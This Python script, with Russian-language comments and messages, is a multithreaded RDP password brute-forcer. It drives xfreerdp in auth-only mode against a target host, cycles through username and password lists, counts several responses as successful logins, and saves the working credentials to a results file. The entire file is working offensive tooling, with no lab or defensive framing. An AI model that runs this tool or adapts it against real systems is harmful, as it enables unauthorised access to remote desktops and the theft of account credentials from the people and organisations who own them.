import os
import re
import sys
import shlex
import time
import subprocess

from termcolor import colored
from optparse import OptionParser
from utils.threadpool import ThreadPool


class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'

    def disable(self):
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.ENDC = ''


class BruteRDP:
    is_success = 0

    def __init__(self, target, port, thread, username=None,
                 username_file=None, password=None, password_file=None):
        self.path_xfreerdp = '/usr/bin/xfreerdp'
        self.rdp_success = "Authentication only, exit status 0"
        self.rdp_success_ins_priv = "insufficient access privileges"
        self.rdp_success_account_locked = "alert internal error"
        self.rdp_error_host_down = "ERRCONNECT_CONNECT_FAILED"  # [0x00020006] [0x00020014]
        self.rdp_error_display = "Please check that the \$DISPLAY environment variable is properly set."

        self.thread = thread
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.username_file = username_file
        self.password_file = password_file

    def rdp_login(self, target, username, password, port):
        """БрутФорс Атака"""

        if BruteRDP.is_success == 1:
            pass
        else:
            rdp_cmd = "%s /v:%s /port:%s /u:%s /p:%s /cert-ignore -clipboard +auth-only " % (
                self.path_xfreerdp, target, port, username, password)

            proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

            brute = "RDP-CONNECT: " + target + ":" + str(port) + " - " + username + ":" + password
            print(brute)

            # For every line out
            for line in proc.stdout:
                # Success
                if re.search(self.rdp_success, str(line)):
                    print(
                        colored('RDP-SUCCESS', 'green', attrs=['bold']),
                        colored(
                            f"{target}:{port} - {username}:{password}",
                            "blue",
                            attrs=['reverse', 'bold']
                        )
                    )

                    with open('result/success.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{target}:{port} - {username}:{password}" + '\n')
                    BruteRDP.is_success = 1
                    break
                elif re.search(self.rdp_success_ins_priv, str(line)):
                    print(
                        colored('RDP-SUCCESS', 'green', attrs=['bold']),
                        colored(
                            f"{target}:{port} - {username}:{password}",
                            "blue",
                            attrs=['reverse', 'bold']
                        )
                    )

                    with open('result/success.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{target}:{port} - {username}:{password}" + '\n')
                    BruteRDP.is_success = 1
                    break
                elif re.search(self.rdp_success_account_locked, str(line)):
                    print(
                        colored('RDP-SUCCESS', 'green', attrs=['bold']),
                        colored(
                            f"{target}:{port} - {username}:{password}",
                            "blue",
                            attrs=['reverse', 'bold']
                        )
                    )

                    with open('result/success.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{target}:{port} - {username}:{password}" + '\n')
                    BruteRDP.is_success = 1
                    break
                # Errors
                elif re.search(self.rdp_error_display, str(line)):
                    mess = "Please check \$DISPLAY is properly set. See README.md"
                    print(colored(f"{mess}!", "red", attrs=['bold']))
                elif re.search(self.rdp_error_host_down, str(line)):
                    mess = "Host isn't up"
                    print(colored(f"{mess}!", "red", attrs=['bold']))

    def run(self):
        """Проверка входных данных"""
        try:
            if not os.path.exists(self.path_xfreerdp):
                print(colored(f"[-] У вас не установлен xfreerdp!", "red", attrs=['bold']))
                sys.exit(1)

            try:
                pool = ThreadPool(self.thread)
            except Exception as err:
                print(colored(f"[-] Произошла ошибка при создание потоков! {err}", "red", attrs=['bold']))
                sys.exit(1)

            if self.username_file:
                if not os.path.exists(self.username_file):
                    print(colored(f"[-] Файл с именами пользователей {self.username_file}, не существует!", "red",
                                  attrs=['bold']))
                    sys.exit(1)

            if self.password_file:
                if not os.path.exists(self.password_file):
                    print(colored(f"[-] Файл с паролями {self.password_file}, не существует!", "red", attrs=['bold']))
                    sys.exit(1)

            if self.username_file:
                try:
                    with open(self.username_file, 'r', encoding='utf-8') as f:
                        userfile = f.read().splitlines()
                        # print('userfile: ', userfile)
                except Exception as err:
                    print(colored(
                        f"[-] Произошла ошибка при чтение файла {self.username_file}! {err}", "red", attrs=['bold'])
                    )
                    sys.exit(1)

                for user in userfile:
                    if ' ' in user:
                        user = '"' + user + '"'

                    if self.password_file:
                        try:
                            with open(self.password_file, 'r', encoding='utf-8') as f:
                                passwdfile = f.read().splitlines()
                                # print('passwdfile: ', passwdfile)
                        except Exception as err:
                            print(colored(
                                f"[-] Произошла ошибка при чтение файла {self.password_file}! {err}", "red",
                                attrs=['bold'])
                            )
                            sys.exit(1)

                        for password in passwdfile:
                            pool.add_task(self.rdp_login, self.target, user, password, self.port)
                    else:
                        pool.add_task(self.rdp_login, self.target, user, self.password, self.port)
            else:
                if self.password_file:
                    try:
                        with open(self.password_file, 'r', encoding='utf-8') as f:
                            passwdfile = f.read().splitlines()
                            # print('passwdfile: ', passwdfile)
                    except Exception as err:
                        print(colored(
                            f"[-] Произошла ошибка при чтение файла {self.password_file}! {err}", "red",
                            attrs=['bold'])
                        )
                        sys.exit(1)

                    for password in passwdfile:
                        pool.add_task(self.rdp_login, self.target, self.username, password, self.port)
                else:
                    pool.add_task(self.rdp_login, self.target, self.username, self.password, self.port)
            pool.wait_completion()
        except Exception as exc:
            print(colored(f"[-] Произошла ошибка в методе run! {exc}", "red", attrs=['bold']))


def arg_func():
    """
        Arguments from command string
    """
    try:
        parser = OptionParser(usage='Используйте --help для получения дополнительной информации')
        parser.add_option("-t", "--target", dest="target", type='string', help="IP Адрес")
        parser.add_option("-p", "--port", dest="port", type="int", default=3389, help="Порт RDP")
        parser.add_option(
            "-u", "--username", dest="username", type="string", default=None, help="Имя пользователя для входа по rdp"
        )
        parser.add_option(
            "-U", "--username_file", dest="username_file", type="string", default=None,
            help="Имена пользователей для входа в систему, сохраненные в файле"
        )
        parser.add_option(
            '-c', '--password', dest='password', type='string', default=None, help="Пароль для входа по rdp"
        )
        parser.add_option("-C", "--password_file", dest="password_file", type="string", default=None,
                          help="Пароли для входа в систему, сохраненные в файле"
                          )
        parser.add_option(
            '-n', '--number', dest='thread', type='int', default=min(32, os.cpu_count() + 4),
            help="Количество потоков"
        )

        options, _ = parser.parse_args()
        if not options.target and not options.target_file:
            parser.error(colored(
                "Введите -t IP Адрес", "yellow", attrs=['bold'])
            )

            parser.error(colored("Введите IP-Адрес Цели -t or --target", "yellow", attrs=['bold']))
        if not options.username and not options.username_file:
            parser.error(colored(
                "Введите -u имя пользователя или -U путь к файлу с именами пользователей", "yellow", attrs=['bold'])
            )
        if not options.password and not options.password_file:
            parser.error(colored(
                "Введите -c пароль или -C путь к файлу с паролями", "yellow", attrs=['bold'])
            )
        else:
            return options
    except Exception:
        print(colored('[-] An error occurred while adding arguments', 'red', attrs=['bold']))


if __name__ == '__main__':
    # Запускаем счетчик время работы скрипта
    start = time.time()

    options = arg_func()

    # Запуск
    rdp = BruteRDP(
        target=options.target,
        port=options.port,
        username=options.username,
        password=options.password,
        username_file=options.username_file,
        password_file=options.password_file,
        thread=options.thread
    )

    rdp.run()

    if BruteRDP.is_success == 0:
        print(colored(f"[-] Не нашли результатов!", "yellow", attrs=['bold']))

    # Показываем время выполнения скрипта
    end = time.time() - start
    print('Общее время выполнения Скрипта: ', end)
